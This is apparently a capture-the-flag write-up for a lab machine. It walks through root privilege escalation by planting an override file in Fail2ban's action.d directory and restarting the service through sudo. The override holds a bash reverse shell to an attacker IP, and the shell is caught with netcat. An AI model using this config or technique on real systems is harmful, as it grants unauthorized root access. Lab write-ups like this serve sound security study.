## Fail2ban
Fail2ban is a IPS tool that uses log entries, among other things, to create firewall rules and ban IP addresses that meet certain requirements. Usually a ban will be given out in scenarios like x amount of incorrect authentication attempts using SSH.
### Enumeration
Use the SSH key that was found using the LFI to get a shell as user Michael
- The very first thing I do once landing a shell is check my user's groups/permissions -> on Linux I run the `id` command initially
```bash
$ id
uid=1001(michael) gid=1001(michael) groups=1001(michael),1002(security)
```
- The only important piece of information here is that my user belongs to the 'security' group
- First things first, I check the output of ```$ sudo -l``` to see if this user can run any commands as root....
```bash
$ sudo -l                                                                                                                 │
Matching Defaults entries for michael on trick:                                                                                                               │root@10.10.11.166s password: 
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin                                                    │
 
User michael may run the following commands on trick:                                                                                                         │
    (root) NOPASSWD: /etc/init.d/fail2ban restart
```
Ok, this privesc will almost for sure be through Fail2ban
### Information gathering
The only thing the allowed sudo command allows me to do is restart the Fail2ban service. In other words, the flaw I'm exploiting for the privilege escalation is most likely not with the sudo command itself, but with more generally with the Fail2ban service.
- The first thing I do in this situation is look for a configuration file that tells this service how to run -> `/etc/fail2ban/jail.conf` is what I'm looking for as it details what the service will do when a ban is given out.
- There is a lot of content that isn't relevant to the privesc in this file. The 2 lines that are really important are:
```bash
banaction = iptables-multiport
banaction_allports = iptables-allports
```
Once Fail2ban has decided an IP address needs a ban, it has a number of files located in `/etc/fail2ban/action.d/` that tell the service how to carry out a ban. Those 2 lines from the configuration file are references to files in the `action.d` directory. In other words, `banaction = iptables-multiport` refers to `/etc/fail2ban/action.d/iptables-multiport.conf`
- If I can overwrite that file, I can cause the Fail2ban service to execute whatever code I want by causing a ban to take place...
```bash
$ ls -la action.d/
total 288
drwxrwx--- 2 root security  4096 Sep  9 17:30 .
drwxr-xr-x 6 root root      4096 Sep  9 17:30 ..
[TRUNCATED]
-rw-r--r-- 1 root root      1420 Sep  9 17:30 iptables-multiport.conf
[TRUNCATED]
```
I can't overwrite that file, but notice what group owns this directory....the same group that my user belongs to!
Now the clever bit. In an update to Fail2ban (I am not sure which), it was made possible to overwrite any .conf file in `action.d` by creating a file with the same name but the .local extension. So, if I create a file `/etc/fail2ban/action.d/iptables-multiport.local`, Fail2ban will use that file instead.
### Exploitation
Now the privilege escalation is obvious: 
- Create file `iptables-multiport.local` that includes OS commands for something malicious (a reverse shell in this example)
- Place that file in the `action.d` directory 
- Use sudo to restart Fail2ban
- Spam the box with SSH attempts and catch the reverse shell

Malicious `iptables-multiport.local`:
```bash
$ cat /dev/shm/iptables-multiport.local 
# Fail2Ban configuration file
#
# Author: Cyril Jaquier
# Modified by Yaroslav Halchenko for multiport banning
#

[INCLUDES]

before = iptables-common.conf

[Definition]

# Option:  actionstart
# Notes.:  command executed once at the start of Fail2Ban.
# Values:  CMD
#
actionstart = bash -c 'bash -i >& /dev/tcp/10.10.14.4/9001 0>&1'

[TRUNCATED]
```
Place file in `action.d`:
```bash
michael@trick:/etc/fail2ban$ cd action.d/
michael@trick:/etc/fail2ban/action.d$ cp /dev/shm/iptables-multiport.local  .
```
Restart the service:
```bash
$ sudo /etc/init.d/fail2ban restart
[ ok ] Restarting fail2ban (via systemctl): fail2ban.service.
```
Spam the box with SSH attempts and catch the shell:
```bash
$ nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.10.14.4] from (UNKNOWN) [10.10.11.166] 50620
bash: cannot set terminal process group (3501): Inappropriate ioctl for device
bash: no job control in this shell
root@trick:/# id
id
uid=0(root) gid=0(root) groups=0(root)
```